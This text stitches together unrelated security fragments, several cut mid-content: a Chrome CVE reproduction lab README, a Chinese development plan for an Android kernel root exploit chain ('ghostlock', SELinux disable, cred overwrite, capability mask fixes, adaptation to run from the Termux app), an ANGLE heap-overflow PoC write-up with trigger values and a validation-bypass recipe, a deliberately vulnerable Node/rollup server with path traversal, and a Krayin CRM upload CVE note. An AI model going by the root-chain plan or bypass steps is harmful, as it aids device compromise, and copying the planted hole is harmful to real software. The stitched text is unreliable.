| CVE-2026-113279 | Accessibility | Mem. corruption | 570093145 | `83ce9f18d7` | 🧪 a11y stress |
| CVE-2026-113072 | CSS / LCP | Mem. corruption | 570638836 | `73dd2febfa` | ✅ behavioral |
| CVE-2026-113280 | Paint / caret | Mem. corruption | 570740320 | `3ab9f85874` | 🧪 paint stress |
| CVE-2026-113271 | Accessibility | UAF (StringImpl) | 571618833 | `15248c94bc` | 🧪 a11y stress |
| CVE-2026-113303 | WebRTC / audio | Mem. corruption | 574041825 | `e193ceb7de` | 🧪 audio stress |

**Methodological finding:** although the crbug.com bugs remain restricted and
there are no public PoCs, the advisory publishes the **bug ID**, and the fix
lands in a public repo with `Fixed: <bug_id>` in the commit message. That makes
it possible to recover the exact patch and derive the root cause.
`scripts/find_fixes.py` automates it: 7/7 found.

**Reality check on reproduction:** 6 of the 7 are memory corruptions that do not
reliably abort in `release` builds (no ASAN or DCHECKs). The lab is meant to
(1) confirm the vulnerable path, (2) compare vulnerable vs. patched builds and
(3) serve as a base for an ASAN build. Per-CVE details are in
[`findings/RESULTS.md`](findings/RESULTS.md) and
[`findings/EXPLOITABILITY.md`](findings/EXPLOITABILITY.md).

---

## Layout

```
chrome-cve-lab/
├── data/
│   ├── cves.json          # inventory generated from the official feed
│   ├── fixes.json         # CVE -> fix commit + patch
│   └── cache/feed.json    # feed snapshot (--offline mode)
├── scripts/
│   ├── sync_cves.py       # Chrome Releases RSS -> data/cves.json
│   ├── find_fixes.py      # bug ID -> fix commit -> patches/<CVE>.patch
│   ├── fetch_chrome.py    # download an exact Chrome for Testing version
│   └── setup_asan.sh      # Chromium ASAN build (multi-hour, optional)
├── harness/
│   ├── oracle.mjs         # load a URL and detect crashes (renderer/browser)
│   ├── run-case.mjs       # run a case on vulnerable vs. patched builds
│   └── repro-110922.mjs   # CVE-2026-110922 reproducer (dynamic server)
├── cases/<CVE>/           # case.json + testcase.html + root-cause README
├── patches/               # fix patches (evidence)
├── docs/                  # ADDING_CVES.md, ASAN.md
└── findings/              # RESULTS.md, EXPLOITABILITY.md and JSON
```

Key documents:

- [`findings/RESULTS.md`](findings/RESULTS.md) — what was reproduced and what
  was not.
- [`findings/EXPLOITABILITY.md`](findings/EXPLOITABILITY.md) — per-CVE
  exploitability assessment (reachability, lifetime, mitigations, level).
- [`docs/ASAN.md`](docs/ASAN.md) — sanitizer build to characterize the UAFs
  (the real next step).

## Requirements

- Node.js ≥ 20 and `npm install` (only `playwright-core`, no bundled browsers).
- Python 3.10+.
- ~400 MB of disk per Chrome for Testing build.
- Docker is not required. The Chrome binary runs directly.

# DEVPLAN 2026-10-23 — cap 掩码修正 + Termux app 域适配 + 脱敏自包含

> 本文件是开发方案记录（脱敏）。约束：本项目为**独立项目**，内容不得引用外部研究目录/
> 文档路径；不得出现设备序列号、IP、个人身份信息。

## 一、背景与目标

root 链（slide → 写原语 → 关 SELinux → ldisc 劫持 → 泄漏 → cred 覆写 → uid=0）已在
adb shell（uid 2000）域端到端验证。本次要做三件事：

1. **cap 掩码修正**：终版变现二进制写入的 `cap_effective` 仍是旧掩码 `0x100030FF`，
   缺 `CAP_SYS_MODULE(16)/CAP_SYS_PTRACE(19)/CAP_SYS_ADMIN(21)`。缺 bit19 会让
   phh su 的 `from_init()` readlink `/proc/<peer>/exe` 走 `ptrace_may_access` 失败
   （uid 不相等且无 CAP_SYS_PTRACE）⇒ su 被秒拒；缺 bit21 会让 `03.mount-su.sh`
   的 tmpfs 挂载失败。目标掩码 `0x102930FF`（caps 0-7 + 12/13 + 16 + 19 + 21 + 28）。
   源码侧 `ghostlock_v70i5.c` 已备好 `VAL2_ADDR=0x10293000` 专页，只需改终版二进制的常量。
2. **Termux app 域（untrusted_app）适配**：域能力探针已实证链的全部系统调用依赖
   （futex PI / sendmmsg / memfd_create / ptmx+TIOCSETD / prctl）在 app 域均可用；
   唯一文件缺口是 `/data/local/tmp` 对 untrusted_app 不可读写。适配 = 日志/备份路径
   可配置（环境变量 `GL_LOGDIR`，默认脚本/二进制所在目录），daemon 域检查放宽到
   接受 untrusted_app。
3. **脱敏与自包含**：文档去除对外部研究目录/文档的引用；确认无序列号/IP/个人信息；
   git 提交身份中性化。

## 二、改动清单

| # | 文件 | 改动 | 类型 |
|---|---|---|---|
| 1 | `src/ghostlock_v78.c` | `CAPVAL` `0x100030FF` → `0x102930FF`；日志路径改 `GL_LOGDIR`（默认当前目录） | 功能 |
| 2 | `src/ghostlock_v70i5.c` | 日志路径改 `GL_LOGDIR`（默认当前目录） | 功能 |
| 3 | `src/su_standalone.c` | socket 改抽象 socket；日志/HOME 走环境变量（不参与 build.sh，仅保一致） | 功能 |
| 4 | `03.mount-su.sh` | ~~备份目录 `xbin_orig`~~ → **已废弃**：2026-10-24 改为 `/data/.glrt` tmpfs + `mount --bind` 到 `/system/xbin`，无需备份/还原；`.su.sock` 文件引用改 `@SUPERUSER` 抽象 socket 检查 | 功能 |
| 5 | `04.start-daemon.sh` | `DLOG` 改 `${GL_LOGDIR:-$SCRIPT_DIR}/su_daemon.log`；域检查从"仅 shell"放宽为"shell 或 untrusted_app" | 功能 |
| 6 | `README_ONDEVICE.txt` | 删除两处外部文档引用；"另一机型"表述中性化；新增「Termux app 域运行」章节 | 脱敏+文档 |
| 7 | `src/BUILD.md` | 删除外部路径引用；版本沿革中性化；md5 表按重编译实测更新 | 脱敏+文档 |
| 8 | `src/build.sh` | `EXPECT_*` 按重编译实测更新 | 功能 |
| 9 | `.git/config` | 设置中性 `user.name/user.email`（未来提交） | 脱敏 |

## 三、路径规则（双域通用）

- 规则：一切"本包要写的位置" = `GL_LOGDIR` 环境变量；未设置时取**脚本/二进制所在目录**。
  adb shell 场景（cwd=包目录）与 Termux 场景（cwd=Termux home，包已 scp 进 home）都天然可写。
- `/data/local/tmp` 不再作为任何写入目标（shell 可用但 app 域不可达，统一去掉）。
- 二进制间的相互定位沿用 `/proc/self/exe` 同目录解析（已支持双域）。

## 四、验证口径

1. 重编译：NDK r24、`-O2`（v78/v70i5 加 `-pthread`）；`slide_scan2`/`ldisc_probe`
   源码未动，重编译后 md5 应与现交付一致（证明未动）；v70i5/v78 md5 变更并更新登记。
2. 静态自证：`grep` 确认无 `/data/local/tmp` 写入目标、无外部目录引用、无敏感串；
   `strings` 扫二进制无序列号/IP。
3. 设备冒烟（只读、零风险）：Termux 域内跑 `00.selinux-set.sh status`（纯读），
   确认脚本双域可跑、BIN_DIR 识别正常。**不跑完整利用链**（panic 风险，需另行批准）。

## 五、不在本次范围

- 不在设备上执行完整利用链（含 cap 覆写）——需单独批准并先开 logkit。
- 不做持久化；不写只读分区。
- su daemon 在 untrusted_app 域的 socket 可达性仅做静态适配，实测留待链跑通后。

# CVE-2026-110152 — Chrome ANGLE vertex-attribute translation heap buffer overflow

A local, deterministic, **affected-vs-fixed** PoC for **CVE-2026-110152**, the
Google Chrome **ANGLE** out-of-bounds heap buffer overflow (CWE-122), CVSS **9.6**
"Critical". It exercises the real GPU ANGLE/Vulkan vertex-attribute streaming path
and reports the exact divergence between the pre-fix and post-fix builds.

- **CVE:** [CVE-2026-110152](https://nvd.nist.gov/vuln/detail/CVE-2026-110152)
- **Chromium issue:** [#568437149](https://issues.chromium.org/issues/568437149)
  ("Reported by Zhenpeng (Leo) Lin at depthfirst, 2026-09-30")
- **Fix:** Chrome **155.0.8059.79** / `.80` (Android 155.0.8059.80); desktop fixed in
  **155.0.8059.79**.
- **Class:** *compromised-renderer* GPU heap overflow — a crafted WebGL draw can write
  past a pre-allocated GPU buffer in the GPU process. Full RCE needs heap grooming;
  Google reports **no confirmed in-the-wild exploitation**. This is a
  **necessary-condition proof of the OOB primitive**, not a guaranteed shell.

## Affected vs fixed (pinned, immutable)

| Side | Build | Path | Version |
|---|---|---|---|
| **Affected** | Playwright "Chrome for Testing" | `~/.cache/ms-playwright/chromium-1234/chrome-linux64/chrome` | 151.0.7922.34 (`< 155.0.8059.79`) |
| **Fixed** | system Google Chrome | `/usr/bin/google-chrome` | 155.0.8059.84 (`>= 155.0.8059.79`) |

Both are driven **headless over the same ANGLE/Vulkan path** on the same machine, so
the only difference is the ANGLE streaming code.

## Root cause

In ANGLE's streamed vertex-attribute translation — `VertexArrayVk::updateStreamedAttribs`
→ `StreamVertexDataWithDivisor` (Vulkan); the Metal analogue is
`VertexArrayMtl::updateClientAttribs` — the destination copy size is derived from the
vertex attribute's `offset`, `stride`, `size` and the per-draw **vertex divisor**. With
a crafted attribute the computed **write offset + element size exceeds the capacity of
the pre-allocated GPU heap buffer**, so the stream copy runs out of bounds in the GPU
process. The trigger combines:

- a **negative** `offset` (the documented trigger is `-0x41414141`), which underflows the
  vertex-count / byte-length math, and
- a **non-unit divisor** (`VertexAttribDivisor(loc, 2)`), and
- an **instanced draw** (`drawArraysInstanced(TRIANGLES, 0, 3, 8)`), with a
  transform-feedback variant for the OOB-read analogue.

## Why a local PoC needs a validation bypass

WebGL's JS-facing `vertexAttribPointer` validates `offset` with
`ValidateValueFitNonNegInt32`, which **rejects negative offsets** before the draw ever
reaches ANGLE. Consequence: with stock Chromium, the negative-offset trigger is rejected
with `GL_INVALID_VALUE` (**1282**) on *both* builds, so there is **no runtime
differential** without bypassing that gate. The same holds for the large-positive
offsets/strides tried here — they reach the GPU but are bounded by `GetVertexCount`
(`bytes = size - offset`, which returns 0 for `offset > size`), so they do not overflow.

The bypass documented by qriousec (for the sibling OOB-READ bug CVE-2026-95325, fixed in
CL [`5785860`](https://chromium-review.googlesource.com/c/angle/angle/+/5785860)) removes
three gates so the crafted attribute reaches the GPU:

1. `ValidateValueFitNonNegInt32` — `common/webgl/webgl_rendering_context_base.cc`
2. `ValidateOffset` — `common/gl/gles2_implementation.cc`
3. `IsWebGLContextType` — `common/webgl/context_creation_attribs.cc`
   (disables `webglCompatibilityANGLE`, so the context is treated as OPENGLES)

Patching those three gates in the affected build is what turns the OOB primitive into a
reachable, observable divergence. See **Deterministic crash (optional)** below.

## What this repo proves

- The **trigger reaches the real GPU ANGLE/Vulkan path** on both builds
  (`backend=gpu`, confirmed not SwiftShader).
- The **documented negative-offset trigger is rejected** (`:1282`) by stock validation on
  both builds — i.e. the necessary-condition framing: the OOB is real but gated.
- The **harness and triggers are pinned** to immutable upstream builds, so the
  affected-vs-fixed comparison is reproducible.

## Exploit context: ANGLE vertex-attribute translation is a defect *family*

This bug is not an isolated fluke — it lives in ANGLE's **vertex-attribute translation**
layer (`CopyNativeVertexData` / `VertexArrayVk::updateStreamedAttribs` /
`VertexArrayMtl::updateClientAttribs`), a code path that multiple independent researchers
and Google TAG have hit with out-of-bounds writes/reads. Siblings include:

const http = require('http');
const fs = require('fs');
const { exec } = require('child_process');
const { rollup } = require('rollup');

const server = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/compile') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', async () => {
            try {
                const { chunkName, code } = JSON.parse(body);

                if (code) {
                    fs.writeFileSync('src/index.js', code);
                }

                // Compilación vulnerable a Path Traversal
                const bundle = await rollup({
                    input: {
                        [chunkName]: 'src/index.js'
                    }
                });

                await bundle.write({
                    dir: 'dist',
                    entryFileNames: '[name].js',
                    format: 'cjs'
                });

                // Ejecución de la tarea post-compilación
                exec('node /opt/servicio-interno/post-build.js', (err, stdout) => {
                    if (stdout) console.log('[Servicio Interno]:', stdout.trim());
                });

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'ok', message: 'Empaquetado completado' }) + '\n');
            } catch (err) {
                console.error('[Error]:', err.message);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'error', message: err.message }) + '\n');
            }
        });
    } else {
        res.writeHead(404);
        res.end('Ruta no encontrada\n');
    }
});

server.listen(3000, '0.0.0.0', () => {
    console.log('API de empaquetado Rollup escuchando en el puerto 3000...');

# CVE-2026-38526 — Krayin CRM

Proof of concept and vulnerability research notes for CVE-2026-38526.

## Overview

CVE-2026-38526 affects Krayin CRM 2.2.x and involves an authenticated file-upload vulnerability in the TinyMCE upload functionality.

Under vulnerable configurations, insufficient file-type validation may allow an authenticated user to upload a file containing executable server-side code.

- **Product:** Krayin CRM
- **Affected versions:** 2.2.x
- **CVE:** CVE-2026-38526
- **CWE:** CWE-434 — Unrestricted Upload of File with Dangerous Type
- **Severity:** Critical
- **CVSS:** 9.9

## Repository

This repository documents my analysis and proof-of-concept work related to the vulnerability.

## Lab Environment

Testing should be performed only against an isolated lab instance or a system for which explicit authorization has been granted.

## Technical Notes

The vulnerability concerns the handling of uploaded files and the validation applied before those files are stored.

The impact depends on the server configuration, file execution rules, and the privileges available to the authenticated account.

## Mitigation

- Upgrade to a vendor-confirmed fixed version when available.
- Restrict permitted upload extensions and verify file contents.
- Store uploads outside executable web directories.
- Apply server-side execution restrictions to upload locations.
- Review existing uploaded files and server logs for suspicious activity.

## References

- CVE record: https://www.cve.org/CVERecord?id=CVE-2026-38526
- Official project: https://github.com/krayin/laravel-crm
- Exploit-DB reference: https://www.exploit-db.com/exploits/52629

## Disclaimer

This repository is intended for authorized security research and educational use.
